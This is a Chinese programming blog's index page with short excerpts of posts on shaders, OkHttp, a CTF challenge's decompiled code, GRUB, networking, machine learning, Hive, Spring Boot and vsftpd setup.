			<a href="/posts/e0817a039882aebbaa735b4880479e60/" rel="bookmark">
			着色器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 着色器从入门到精通一
着色器 概要: 1.深入图形渲染流程内部，了解什么是着色器 2.了解three.js对着色器的封装 1什么是着色器 你也许会问，到底什么是着色器？好吧，从3D图形学历史的角度来讲，它的确曾经扮演过和它名字一样的角色，即二进制码。例如告诉显卡如何在绘制一个场景之前进行渐变或上色。但随着时间的推移，着色器开始渐渐扩展自己的应用范围，现在应当把它定义为一种二进制码，它能够在绘制一个场景之前做任何想要做的事情。这的确非常实用，一时因为这些操作是在显卡中进行的，所以运行速度非常快；二是因为它能够实验很多three.js本身无法实现的功能，并且提高three.js的性能。 无论是在opengl、opengles、还是dx中，着色器都分为顶点着色器和片元着色器。通俗的讲顶点着色器就是对顶点进行操作。例如改变定点的位置和顶点的大小。片元着色器通俗的讲就是用来定义屏幕中显示的各个点的颜色的。在进一步理解，如果将three.js比作C语言的话，那么着色器就是汇编语言，显然所有C语言的实现最终都是由汇编语言完成的。所以着色器有比three.js更强大的功能，虽然three.js的功能已经很强大了。 另外，我要告诉大家的是three.js的最底层部分是着色器实现的，这是因为浏览器最底层就只支持着色器。但是着色器的编程确实太过于麻烦，所以才会有three.js这些容易一点的工具。但是无论怎么样，学习着色器都将是一个快乐的过程，因为它能够真真正正的让你成为高手，让你做你想做的任何事情。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31d6df3e8f190bad63e3a2dd4862e384/" rel="bookmark">
			OkHttp3-使用详解-OkHttpClient
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先附上官网地址：http://square.github.io/okhttp/3.x/okhttp/(点击传送官网，如果进不去，请自行翻墙)
翻译官网：
public class OkHttpClient extends Object implements Cloneable, Call.Factory, WebSocket.Factory Factory for calls, which can be used to send HTTP requests and read their responses.
Call.Factory可以发送一个HTTP请求和读取返回的响应。
OkHttpClients should be shared
OkHttpClient应该被共享。
OkHttp performs best when you create a single OkHttpClient instance and reuse it for all of your HTTP calls. This is because each client holds its own connection pool and thread pools. Reusing connections and threads reduces latency and saves memory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31d6df3e8f190bad63e3a2dd4862e384/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbe55af9d2506388c41dd8e13fe363bb/" rel="bookmark">
			cgpwn2 writeup
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		拿到题目检查防护：
简单运行下：
放到ida里看下：
hello函数的代码如下：
char *hello() { char *v0; // eax signed int v1; // ebx unsigned int v2; // ecx char *v3; // eax char s; // [esp+12h] [ebp-26h] int v6; // [esp+14h] [ebp-24h] v0 = &amp;s; v1 = 30; if ( (unsigned int)&amp;s &amp; 2 ) { *(_WORD *)&amp;s = 0; v0 = (char *)&amp;v6; v1 = 28; } v2 = 0; do { *(_DWORD *)&amp;v0[v2] = 0; v2 += 4; } while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) ); v3 = &amp;v0[v2]; if ( v1 &amp; 2 ) { *(_WORD *)v3 = 0; v3 += 2; } if ( v1 &amp; 1 ) *v3 = 0; puts("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbe55af9d2506388c41dd8e13fe363bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6189fb975ed34ca59cc8730022b0e6f/" rel="bookmark">
			Ubuntu 切换系统默认启动内核
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.首先找到内核名称。
grep menuentry /boot/grub/grub.cfg 例如我的最后显示如下，复制所要的内核名称（例如我需要的Ubuntu，Linux 4.15.0-29-generic）。
if [ x"${feature_menuentry_id}" = xy ]; then menuentry_id_option="--id" menuentry_id_option="" export menuentry_id_option menuentry 'Ubuntu' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-simple-3a45027c-15ed-4cec-a233-7c3927e74d11' { submenu 'Ubuntu 高级选项' $menuentry_id_option 'gnulinux-advanced-3a45027c-15ed-4cec-a233-7c3927e74d11' { menuentry 'Ubuntu，Linux 4.15.0-43-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-4.15.0-43-generic-advanced-3a45027c-15ed-4cec-a233-7c3927e74d11' { menuentry 'Ubuntu, with Linux 4.15.0-43-generic (upstart)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-4.15.0-43-generic-init-upstart-3a45027c-15ed-4cec-a233-7c3927e74d11' { menuentry 'Ubuntu, with Linux 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f6189fb975ed34ca59cc8730022b0e6f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbdf9d72e87517cc4817a0d545fcb5cf/" rel="bookmark">
			【计算机网络基础概念】3广域网、网络互联与Internet
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、广域网与网络互联
1、广域网
2、网络互连技术
3、网络互连设备
二、Internet技术与应用
1、域名地址DNS
2、文件传输FTP
一、广域网与网络互联 1、广域网 1. 什么是广域网 广域网是将地理位置上相距较远的多个计算机系统，通过通信线路按照网络协议连接起来，实现计算机之间相互通信的计算机系统的集合。
2. 广域网的构成 广域网由交换机、路由器、网关、调制解调器等多种数据交换设备、数据传输设备构成。
3. 广域网的特点 具有技术复杂性强、管理复杂等特点。广域网还具有类型多样化、连接多样化、结构多样化、提供的服务多样化等特点。
4. 广域网的连接方式 主要是通过公共网络来实现的。公共网络的类型包括：传统的电话网络、租用专线、分组交换数字网络等。
5. 广域网的分类 广域网的连接方式主要是通过公共网络来实现的。公共网络的类型包括：传统的电话网络、租用专线、分组交换数字网络等。
如果以建立广域网的方法对广域网进行分类，广域网可以被划分为：线路交换网、分组交换网、专用线路网等。
6. DDN网 数字数据网（Digital Data Network，以下称DDN）是利用数字信道传输信号的数据传输网，是利用数字通道提供半永久性连接电路，以传输数据信号为主的数字传输网络，DDN的传输媒体有光缆、数字微波、卫星信道以及用户端可用的普通电缆和双绞线。
7. ISDN网 ISDN是由综合数字电话网发展起来的一个网络，它提供端到端的数字连接以支持广泛的服务，包括声音和非声音的。用户的访问是通过少量、多用途的用户网络标准实现的。
ISDN的发展分为两个阶段：第一代为窄带ISDN，即N-ISDN，简称ISDN。第二代ISDN为宽带ISDN，即B-ISD。
2、网络互连技术 1. 网络互连的概念 网络互联是指利用网络互联设备及相应的技术措施和协议把两个以上的计算机网络连起来，实现计算机网络之间的连接，使不同的网络上的用户能互相通信和交换信息。
这不仅有利于资源共享，也可以从整体上提高网络的可靠性。
2. 网络互联的目的 网络互联包含两个方面的内容：
（1） 是将不同的网络用互联设备连接在一起形成一个范围更大的网络；
（2） 是将一个原来很大的网络划分为几个子网或网段。
网络互联的目的：
（1） 延长网络电缆的长度，扩大网络用户之间资源共享和信息传输的范围。
（2） 缩小网络规模，提高网络效率。
（3） 提高异构网络间的互操作性。
3. 网络互连的概念 目前存在着局域网（LAN）和广域网（WAN）两种类型的网络，因而可对应有以下的四种网络互联：
局域网与局域网互联：LAN—LAN
局域网与广域网互联：LAN—WAN
局域网通过广域网与另外的局域网互联：LAN—WAN—LAN
广域网与广域网互联：WAN—WAN。
3、网络互连设备 1. 中继器 中继器是最简单也是最常用的网络连接设备，它的作用是将网络上的一个电缆段上传输的数字信号进行放大和整形，然后再发送到另一个电缆段上，以克服信号经过较长距离传输后引起的衰减。一般情况下，中继器两端连接的既可以是相同的传输媒体，也可以是不同的传输媒体。
由于中继器主要完成物理层功能，所以它只能连接相同的局域网。换句话说，就是利用中继器互联的局域网应具有相同的协议和数据传输速率。
使用中继器时应该注意以下两个问题：
（1）中继器主要用于网段间的延伸，用中继器不能形成回路。
（2）必须遵守MAC协议定时特性，即不能用中继器将电缆段无限制的连接起来。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbdf9d72e87517cc4817a0d545fcb5cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69de1717539008300cdb68e297450af9/" rel="bookmark">
			Unity Button AddListener() 来添加click事件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		button的组件里面有一个方法OnClick. AddListener这个方法来监听点击事件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c140defb0321c1f0954c22639b29193/" rel="bookmark">
			TensorFlow变量初始化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 初始化为随机值：tf.random_normal() import tensorflow as tf w1 = tf.Variable(tf.random_normal([2, 3], stddev=1, seed=1)) with tf.Session() as sess: sess.run(tf.global_variables_initializer()) print (w1) print (sess.run(w1)) 输出结果：
&lt;tf.Variable 'Variable_3:0' shape=(2, 3) dtype=float32_ref&gt; [[-0.8113182 1.4845988 0.06532937] [-2.4427042 0.0992484 0.5912243 ]] tf.random_normal(shape, mean=0.0, stddev=1.0, dtype=tf.float32, seed=None, name=None)
shape: 输出张量的形状，必选
mean: 正态分布的均值，默认为0
stddev: 正态分布的标准差，默认为1.0
dtype: 输出的类型，默认为tf.float32
seed: 随机数种子，是一个整数，当设置之后，每次生成的随机数都一样
name: 操作的名称
其他随机数生成函数可参考官方api：https://www.tensorflow.org/versions/r1.3/api_docs/python/tf/random_normal
2. 初始化为常数 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72cfa245a9be1235456969bea6cb6a4d/" rel="bookmark">
			机器人领域的国际会议介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		机器人领域的顶级国际会议有2个：
1. ICRA
全称是 International Conference on Robotics and Automation。机器人方向的都可以投，投稿日期是每年的4~5月左右。在ICRA上发表的文章有的会以扩充的方式随后出现在一些顶级期刊上，比如TRO和IJRR，可见文章的分量。不容易中，录用率很低，不过我也在上面见到过一些垃圾论文。
2. IROS
全称是 International Conference on Intelligent Robots and System。机器人方向的都可以投，投稿日期是每年的9~10月左右。
下面是一般的会议，相对来说比较容易中。
3. ROBIO
全称是 International Conference on Robotics and Biomimetics。主要针对仿生机器人或生物技术交叉领域，投稿日期是每年的10月左右。录用率大概在1/4左右。
4. ICMA
全称是 International Conference on Mechatronics and Automation。机器人方向的都可以投，投稿日期是每年的6~8月左右。
5. WCICA
全称是 World Congress on Intelligent Control and Automation。机器人方向的都可以投，投稿日期是每年的5~6月左右。如果写的比较正规基本上来者不拒。
6. CYBER
全称是 International Conference on CYBER Technology in Automation, Control and Intelligent Systems。新举办的会议，机器人方向的都可以投，投稿日期是每年的1~2月左右。
7. Humanoids
全称是 International Conference on Humanoid Robots。人形机器人方向的可以投，投稿日期是每年的6~7月左右。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/72cfa245a9be1235456969bea6cb6a4d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/208bc67c0d0512051ba8b6daf215ef8c/" rel="bookmark">
			大数据工具千千万，到底谁才是最强王者？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		外面有成千上万的大数据工具。它们都承诺可以为你节省时间和资金，并帮助发掘之前从来见过的业务洞察力。虽然确实如此，可是面对那么多的选择，想理清这么多的工具谈何容易。
哪一种工具适合你的技能组合?哪一种工具适合你的项目?
为了替你节省一点时间，并帮助你首次选对工具，我们列出了我们青睐的几款数据工具，涉及数据提取、存储、清理、挖掘、可视化、分析和整合等领域。
数据存储和管理
如果你准备处理大数据，就要考虑该如何存储大数据。大数据得到“大”这个名号，一方面在于，大数据太庞大了，传统系统处理不了。一家优秀的数据存储提供商应该可以为你提供一套基础设施，除了用来存储和查询数据外，你还可以在上面运行其他所有分析工具。
Hadoop
大数据工具千千万，到底谁才是最强王者？
Hadoop这个名称已成为了大数据的代名词。它是一种开源软件框架，用于在计算机集群上分布式存储非常庞大的数据集。这一切意味着你可以扩大或缩小数据规模，没必要为硬件故障而担心。Hadoop为任何一种数据提供了海量存储空间、强大的处理能力以及处理几乎无限制的并发任务或作业这一功能。
Hadoop并不适合数据初学者。想真正发挥其功能，你其实需要知道Java。这可能需要一番投入，但是Hadoop无疑值得你付出努力――因为其他许多公司和技术运行在它的基础上或者与它整合起来。
Cloudera
大数据工具千千万，到底谁才是最强王者？
说到Cloudera，它其实是Hadoop的一个品牌名，上面添加了一些额外服务。它可以帮助贵公司构建一个企业数据枢纽，让贵企业的人员可以更方便地访问所存储的数据。
虽然确实有开源组件，但Cloudera主要还是一款企业解决方案，帮助公司管理Hadoop生态系统。实际上，它可以替你处理管理Hadoop的大量繁重工作。它还提供了一定级别的数据安全性，如果你要存储任何敏感数据或私人数据，这至关重要。
MongoDB
大数据工具千千万，到底谁才是最强王者？
MongoDB是新颖的现代数据库方法，可谓是后起之秀。它好比是关系数据库的替代技术。它适用于管理经常变化的数据或者非结构化或半结构化数据。
常见的使用场合包括：为移动应用程序、产品目录、实时个性化、内容管理以及跨多个系统提供单一视图的应用程序存储数据。MongoDB同样不适合数据新手。与任何数据库一样，你确实需要了解如何使用一种编程语言来查询它。
Talend
大数据工具千千万，到底谁才是最强王者？
Talend是另一家出色的开源公司，它提供许多数据产品。我们在这里主要介绍其主数据管理(MDM)产品，该产品将实时数据、应用程序和流程整合与嵌入式数据质量及监管结合起来。
由于是开源产品，Talend完全免费，因而是个不错的选择，无论贵公司处于哪个发展阶段。而且，它让你没必要构建和维护自己的数据管理系统――这是一项非常复杂而困难的任务。
开始入门
大数据工具千千万，到底谁才是最强王者？
如果你对大数据完全一无所知，数据库可能不是最适合入手的方面。它们比较复杂，确实需要具备一定的编程知识才能上手(这不像下面提到的其他许多工具)。
然而，如果你确实想要从事或处理大数据，那知道数据库的基本知识、聊起数据库头头是道必不可少。你可以全面了解推动大数据的技术，包括数据库和存储发展史、关系数据库和文档数据库的区别、大数据的挑战以及必不可少的工具，还有Hadoop简要介绍。
数据清理
大数据工具千千万，到底谁才是最强王者？
在你真正挖掘数据、获取洞察力之前，需要清理数据。尽管创建一个整洁、结构清晰的数据集总是好做法，但有时这并非始终行得通。数据集可能形状和大小不一(有些好的，有些不太好!)，尤其是你从网上获取数据时。下列公司可以帮助你完善和重组数据，处理成实用的数据集。
OpenRefine
大数据工具千千万，到底谁才是最强王者？
OpenRefine(以前叫GoogleRefine)是一种开源工具，专门用于清理凌乱的数据。你可以轻松快速地浏览庞大的数据集，即便数据有点非结构化。
就数据软件而言，OpenRefine很易于使用。不过，熟悉数据清理原则肯定有所帮助。OpenRefine好就好在，它有一个庞大社区，拥有众多贡献者，这意味着这款软件在不断变得完善。要是遇到了难题，你可以向社区提问。可以查看其Github代码库
DataCleaner
大数据工具千千万，到底谁才是最强王者？
DataCleaner认识到数据处理是一项冗长乏味的任务。数据可视化工具只能读取结构条理化、“干净”的数据集。DataCleaner可以替你干脏活，将凌乱的半结构化数据集转换成干净的、可读取的数据集，那样所有可视化公司都能读取。
数据挖掘
大数据工具千千万，到底谁才是最强王者？
别将数据挖掘与后面介绍的数据提取混为一谈，数据挖掘是指发现数据库里面的洞察力，而不是从网页提取数据、然后放入到数据库。数据挖掘旨在对你手头的数据进行预测和决策。
RapidMiner
RapidMiner拥有一大批客户，包括贝宝、德勤、电子港湾和思科等，这是一款用于预测分析的出色工具。它功能强大、易于使用，还有一个优秀的开源社区。通过API，你甚至可以将自己的专用算法整合到RapidMiner中。
图形化界面意味着，你不需要知道如何编程或不需要有博士学位，就可以使用其四款分析产品中的任何一款。
IBM SPSS Modeler
大数据工具千千万，到底谁才是最强王者？
IBM SPSS Modeler提供了一整套专门用于数据挖掘的解决方案。这包括文档分析、实体分析、决策管理和优化。其五款产品提供了一系列高级算法和技巧，包括文档分析、实体分析、决策管理和优化。
SPSS Modeler是一款功能强大的解决方案，很适合满足大公司的需要。它可以在几乎任何类型的数据库上运行，你可以将它与其他IBM SPSS产品整合起来，比如SPSS协作及部署服务和SPSS Analytic服务器。
甲骨文数据挖掘
大数据工具千千万，到底谁才是最强王者？
数据挖掘领域的另一大巨头是甲骨文。作为其高级分析数据库(Advanced Analytics Database)选件的一部分，甲骨文数据挖掘让用户可以发掘洞察力、进行预测并利用甲骨文数据。你可以构建模型来发现客户行为、锁定最佳客户并开发配置文件。
甲骨文数据挖掘GUI让数据分析员、业务分析员和数据科学家能够使用一种相当优雅的拖放式解决方案，在数据库里面处理数据。它还能创建SQL和PL/SQL脚本，用于整个企业里面的自动化、调度和部署。
Teradata
大数据工具千千万，到底谁才是最强王者？
Teradata认识到这个事实：虽然大数据很出色，但如果你其实不知道如何分析和使用大数据，它就毫无价值。设想一下：拥有成千上万个数据点，却没有查询这些数据点的技能。这时候，Teradata应运而生。它为数据仓库、大数据、分析及营销等应用提供了端到端解决方案和服务。这一切意味着，你可以真正成为一家数据驱动型公司。
Teradata还提供一整套服务，包括实施、业务咨询、培训和支持。
FramedData
大数据工具千千万，到底谁才是最强王者？
如果你着眼于某一种类型的数据挖掘，有一批初创公司专门帮助公司利用数据解答难题。如果你担心用户流失，我们推荐FramedData，这家初创公司可以分析你的数据分析结果，告诉你哪些客户即将抛弃你的产品。
它是一款完全托管的解决方案，这意味着你没必要做任何事，只需等待洞察力呈现在面前。
Kaggle
大数据工具千千万，到底谁才是最强王者？
Kaggle是世界上最庞大的数据科学社区。许多公司和研究人员发布数据，来自世界各地的统计人员和数据挖掘人员竞相制作最佳模型。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/208bc67c0d0512051ba8b6daf215ef8c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/add78ad53d4b8ec607caa374c3834cad/" rel="bookmark">
			DBSCAN聚类算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DBSCAN算法 1.基本概念
核心对象：若某个点的密度达到算法设定的阈值则其为核心点。（即 邻域内点的个数不少于minPts）
ε \varepsilon ε邻域的距离阈值：设定的半径 ε \varepsilon ε。
直接密度可达：若某点p在q的 邻域内，且q是核心点则p-q直接密度可达。
密度可达：若有一个带你的序列q0、q1、…、qk，对任意qi-qi-1是直接密度可达的，责成从q0到qk密度可达，这实际上是直接密度可达的“传播”。
密度相连：若从某核心点出发，点q和点k都是密度可达的，则称点q和点k是密度相连的。
边界点：属于某一个类的非核心点，不能发展下线了。
噪声点：不属于任何一个类簇的点，从任何一个核心点出发都是密度不可达的。
举例说明：A表示核心对象、B和C表示边界点以及N表示离群点。
2.DBSCAN的思想
DBSCAN的聚类定义很简单：由密度可达关系导出的最大密度相连的样本集合，即为我们最终聚类的一个类别，或者说一个簇。
这个DBSCAN的簇里面可以有一个或者多个核心对象。如果只有一个核心对象，则簇里其他的非核心对象样本都在这个核心对象的ϵ-邻域里；如果有多个核心对象，则簇里的任意一个核心对象的ϵ-邻域中一定有一个其他的核心对象，否则这两个核心对象无法密度可达。这些核心对象的ϵ-邻域里所有的样本的集合组成的一个DBSCAN聚类簇。
那么怎么才能找到这样的簇样本集合呢？DBSCAN使用的方法很简单，它任意选择一个没有类别的核心对象作为种子，然后找到所有这个核心对象能够密度可达的样本集合，即为一个聚类簇。接着继续选择另一个没有类别的核心对象去寻找密度可达的样本集合，这样就得到另一个聚类簇。一直运行到所有核心对象都有类别为止。
基本上这就是DBSCAN算法的主要内容了，是不是很简单？但是我们还是有三个问题没有考虑。
第一个是一些异常样本点或者说少量游离于簇外的样本点，这些点不在任何一个核心对象在周围，在DBSCAN中，我们一般将这些样本点标记为噪音点。
第二个是距离的度量问题，即如何计算某样本和核心对象样本的距离。在DBSCAN中，一般采用最近邻思想，采用某一种距离度量来衡量样本距离，比如欧式距离。这和KNN分类算法的最近邻思想完全相同。对应少量的样本，寻找最近邻可以直接去计算所有样本的距离，如果样本量较大，则一般采用KD树或者球树来快速的搜索最近邻。
第三种问题比较特殊，某些样本可能到两个核心对象的距离都小于ϵ，但是这两个核心对象由于不是密度直达，又不属于同一个聚类簇，那么如果界定这个样本的类别呢？一般来说，此时DBSCAN采用先来后到，先进行聚类的类别簇会标记这个样本为它的类别。也就是说DBSCAN的算法不是完全稳定的算法。
3.工作流程
参数D：输入数据集
参数 ε \varepsilon ε：指定半径
minPts：密度阈值
4.参数选择
半径 ε \varepsilon ε ：可以根据k距离来设定：找突变点。
K距离：给定数据集p={p(i);i=0,1,…,n}，计算点p(i)到集合D的子集S中所有点之间的距离，距离按照从小到大的顺序排序，d(k)就被称为k距离。
minPts：k距离中k的值，一般取的小一些，多次尝试。
5.优劣势
（1）优势
①不需要指定簇的个数；
②可以对任意形状的稠密数据集进行聚类，相对的，K-Means之类的聚类算法一般只适用于凸数据集；
③擅长找到离群点（检测任务）；
④两个参数 ε \varepsilon ε和minPts就够了；
⑤聚类结果没有偏倚，相对的，K-Means之类的聚类算法初始值对聚类结果有很大影响。
（2）劣势
①高维数据有些困难；
②Sklearn中效率很慢（数据削减策略）；
③如果样本集的密度不均匀、聚类间距差相差很大时，聚类质量较差，这时用DBSCAN聚类一般不适合；
④调参相对于传统的K-Means之类的聚类算法稍复杂，主要需要对距离阈值 ε \varepsilon ε，邻域样本数阈值MinPts联合调参，不同的参数组合对最后的聚类效果有较大影响。
参考文档：
https://www.cnblogs.com/pinard/p/6208966.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d95024ba2da8ffe736e1c0875f9a2a4/" rel="bookmark">
			javascript随机打乱数组shuffle
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		javascript 没有为我们提供shuffle打乱数组的函数，那日常开发是怎样实现随机打乱数组呢
一.使用sort方法? 借助 sort 方法不是真正意义上的完全乱序
原因：
在Chrome v8引擎源码中，处理 sort 方法时，使用了插入排序和快排两种方案。当目标数组长度小于10时，使用插入排序；反之，使用快排。
其实不管用什么排序方法，大多数排序算法的时间复杂度介于 O(n) 到 O(n2) 之间，元素之间的比较次数通常情况下要远小于 n(n-1)/2，也就意味着有一些元素之间根本就没机会相比较（也就没有了随机交换的可能），这些 sort 随机排序的算法自然也不能真正随机。
通俗的说，其实我们使用 array.sort 进行乱序，理想的方案或者说纯乱序的方案是：数组中每两个元素都要进行比较，这个比较有 50% 的交换位置概率。如此一来，总共比较次数一定为 n(n-1)。
而在 sort 排序算法中，大多数情况都不会满足这样的条件。因而当然不是完全随机的结果了。
某些场景下，这样的方法可以使用。但是这不是真正意义上的完全乱序，一些需求中（比如抽奖）这样的写法会出大问题。
var arr = ['A','B','C','D','F']; var brr = [1,2,3,4,5,6,7,8]; var arr1 = arr.sort(function() { return .5 - Math.random(); }); var brr1 = brr.sort(function() { return .5 - Math.random(); }); console.log(arr1); console.log(brr1); 二.Fisher–Yates shuffle 洗牌算法 Fisher–Yates shuffle 洗牌算法可以做到理论上的完全乱序
lodash.js 中的 shuffle 函数也使用此算法实现
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d95024ba2da8ffe736e1c0875f9a2a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b2da6a1e034c379f556d5f7db0044ad/" rel="bookmark">
			林子雨hive实践教程错误笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.注意最后要加上这一句话，没有这句话，就会报错。
alter database hive set dbproperties('edited-by'='hadoop');#为hive设置键值对属性 hive-site.xml的正确配置方式应加上&amp;amp;useSSL=false，否则会出现warning提示。其中&amp;amp;是&amp;在HTML中对应的转义符。
&lt;configuration&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt; &lt;value&gt;jdbc:mysql://localhost:3306/hive?createDatabaseIfNotExist=true&amp;amp;useSSL=false&lt;/value&gt; &lt;description&gt;JDBC connect string for a JDBC metastore&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt; &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt; &lt;description&gt;Driver class name for a JDBC metastore&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt; &lt;value&gt;hive&lt;/value&gt; &lt;description&gt;username to use against metastore database&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt; &lt;value&gt;hive&lt;/value&gt; &lt;description&gt;password to use against metastore database&lt;/description&gt; &lt;/property&gt; &lt;/configuration&gt; 2.创建内部表修正。
create table if not exists hive.usr( name string comment 'username', pwd string comment 'password', address struct&lt;street:string,city:string,state:string,zip:int&gt; comment 'home address', identify map&lt;int,tinyint&gt; comment 'number,sex') comment 'description of the table' tblproperties('creator'='me','time'='2019.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b2da6a1e034c379f556d5f7db0044ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58cb5b6c002e858047b9ad78d1071af5/" rel="bookmark">
			解决：Field xxMapper in xx.service.impl.xxServiceImpl required a bean of type ‘xx.mapper.xxMapper‘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前些天发现了一个巨牛的人工智能学习网站，通俗易懂，风趣幽默，忍不住分享一下给大家。点击跳转到教程。
1. 启动 springboot 项目报错：
Field userMapper in gentle.service.impl.UserServiceImpl required a bean of type 'gentle.mapper.UserMapper' that could not be found 2. 原因，项目未扫描到 mapper 包。
3. 解决：
在项目启动类上加注解 @MapperScan
如下：
4. 重启工程成功运行：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43c1a50173d4edbedbcbb791db5d3c84/" rel="bookmark">
			linux搭建ftp服务器，并用虚拟用户上传下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		配置信息： CentOS Linux release 7.5.1804 (Core)
vsftpd: version 3.0.2
第一步：安装vsftpd服务器 yum install vsftpd
第二步：修改配置文件/etc/vsftpd/vsftpd.conf 。我的配置文件如下 anonymous_enable=NO
local_enable=YES
write_enable=YES
local_umask=022
dirmessage_enable=YES
xferlog_enable=YES
connect_from_port_20=YES
xferlog_std_format=YES
listen=YES
listen_port=4098
pam_service_name=vsftpd
userlist_enable=YES
tcp_wrappers=YES
guest_enable=YES
virtual_use_local_privs=YES
user_config_dir=/etc/vsftpd/vus
chroot_local_user=YES
allow_writeable_chroot=YES
async_abor_enable=YES
ascii_upload_enable=YES
ascii_download_enable=YES
guest_username=ftp
anon_upload_enable=YES
第三步：创建虚拟用户 1.编写用户账号密码数据文件（奇数行为用户名，偶数行为密码）
2.执行命令生产db文件：
db_load -T -t hash -f vsftpd_login vsftpd_login.db
第四步：编写虚拟用户权限文件 在vsftp配置文件中的user_config_dir=/etc/vsftpd/vus目录下创建一个以用户名为文件名的文件。如deploy用户，文件名为/etc/vsftpd/vus/deploy，内容如下
local_root=/data/ftp-deploy
write_enable=YES
download_enable=YES
anon_upload_enable=YES
anon_world_readable_only=NO
anon_other_write_enable=YES
anon_mkdir_write_enable=YES 配置解析：
local_root 用户的目录
anon_world_readable_only 允许匿名登入者下载可阅读的档案
anon_mkdir_write_enable 允许匿名登入者有新增目录的权限，只有在write_enable=YES时，此处设置为NO为了测试。
anon_upload_enable 允许匿名登入者有上传文件（非目录）的权限，只有在write_enable=YES时
anon_other_write_enable 允许匿名登入者更多于上传或者建立目录之外的权限，譬如删除或者重命名
第五步：配置pam.d目录下vsftpd控制文件（/etc/pam.d/vsftpd） 注销掉原来的所有，增加下面两行配置（红色路径指向刚刚生成的db文件，不需要带db后缀）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43c1a50173d4edbedbcbb791db5d3c84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/819eb617c59e2153bd80f60b0e82b4f9/" rel="bookmark">
			CSDN博客添加打赏功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 微信打赏 打开微信扫一扫，扫码下面的【微信支付】二维码图片即可进行扫码打赏哦
2. 支付宝打赏 打开支付宝扫一扫，扫码下面的【支付宝】二维码图片即可进行扫码打赏哦
3. QQ打赏 打开QQ扫一扫，扫码下面的【QQ】二维码图片即可进行扫码打赏哦
4. 微信公众号: real_x2019 5. 为博客添加打赏功能 打开【管理博客】
滚动到下方【栏目管理】
点击【自定义栏目】
